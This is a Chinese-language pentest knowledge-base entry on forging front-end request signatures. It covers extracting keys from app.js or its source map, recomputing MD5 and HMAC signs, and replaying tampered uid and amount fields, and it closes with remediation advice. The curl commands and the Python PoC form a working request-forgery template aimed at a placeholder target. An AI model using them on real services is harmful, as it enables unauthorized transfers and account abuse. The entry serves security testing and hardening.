---
title: 前端签名 / 加密可逆（伪造请求绕过风控）
cve: 无（实现缺陷）
severity: high
cvss: 8.1
product: H5 / App 自研接口（自定义 sign、AES 请求体）
versions: 任意
ports: 80, 443
keywords: sign, hmac, aes, 前端加密, 可逆, nonce, timestamp, 风控
entry: app.js 里抄出算法与 key，重算 sign
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

- 请求头带 `X-Sign`、`X-Timestamp`、`X-Nonce`、`X-Device`；body 是 `data=<base64>` 或 AES 密文。
- 前端 bundle 里有 `md5(secret + ...)`、`CryptoJS.AES.encrypt`、硬编码 `key`/`iv`。

## 前置条件

- 有账号；能拿到前端 JS（H5 直接下载，App 解包或走 `.map`）。
- 明确一点：**拼接顺序与参与字段按现场 JS 为准**，不要照抄本条示例。常见三种：

```
3 段:  md5(body + ts + secret)
4 段:  md5(body + ts + nonce + secret)
签名头: HMAC-SHA256(secret, `${ts}\n${nonce}\n${body}`) → header
```

## PoC

```bash
# 1) 拿算法与密钥
curl -s https://target/static/js/app.js | grep -Eo '(AES|HmacSHA256|md5)\([^)]{0,80}' | head
curl -s https://target/static/js/app.js.map -o app.js.map   # 存在即可还原源码

# 2) 负控先行：把算好的 sign 换成 deadbeef（或翻转末位字符），确认服务端拒绝
#    若"错误签名也能过" ⇒ 结论不是"签名可伪造"，而是"根本没有验签"（更严重，另立结论）

# 3) 复算签名并重放越权参数（示例按 4 段；以现场为准）
python3 - <<'PY'
import hashlib,time,requests
secret='<从 js 里抄到的 key>'
ts=str(int(time.time()*1000)); nonce='abc123'
body='{"uid":10001,"action":"transfer","amount":1}'
sign=hashlib.md5((body+ts+nonce+secret).encode()).hexdigest()
r=requests.post('https://target/api/x',data=body,headers={
  'X-Sign':sign,'X-Timestamp':ts,'X-Nonce':nonce,'Content-Type':'application/json'})
print(r.status_code, r.text[:200])
PY
```

## 利用步骤

1. 定位签名函数与参数顺序（常量、时间戳、nonce、body 的拼接顺序，以及是否做了 URL 编码/JSON 紧凑化）。
2. 负控：错误签名应被拒（401/403）→ 说明确实验签；然后复算一个**合法**请求确认服务端接受（200 且业务成功）。
3. 用同一套算法改 `uid`/`amount`/`room`，服务端接受"签名正确、主体不是我"的请求 ⇒ 签名不是安全边界（与 `api-idor-bola.md` 组合放大）。
4. 若密文可逆（AES 固定 key/iv、ECB），解密看字段含义，再构造任意明文。
5. 判定：**签名正确 + 越权结果** 同时成立才算"可伪造"；只有"能重算"没有越权，只是逆向发现，不是漏洞。

## 修复与缓解（加固）

- 关键逻辑服务端；前端只做展示，不做信任边界。
- 若必须签名：密钥服务端下发短时 token + HMAC + nonce 防重放（服务端存 nonce TTL）。
- 敏感字段服务端二次校验（金额、uid 从会话取）；风控基于服务端事实而非客户端声明。

## 参考

- OWASP Mobile Top 10 M7（代码质量/逆向）；OWASP A04 Insecure Design。
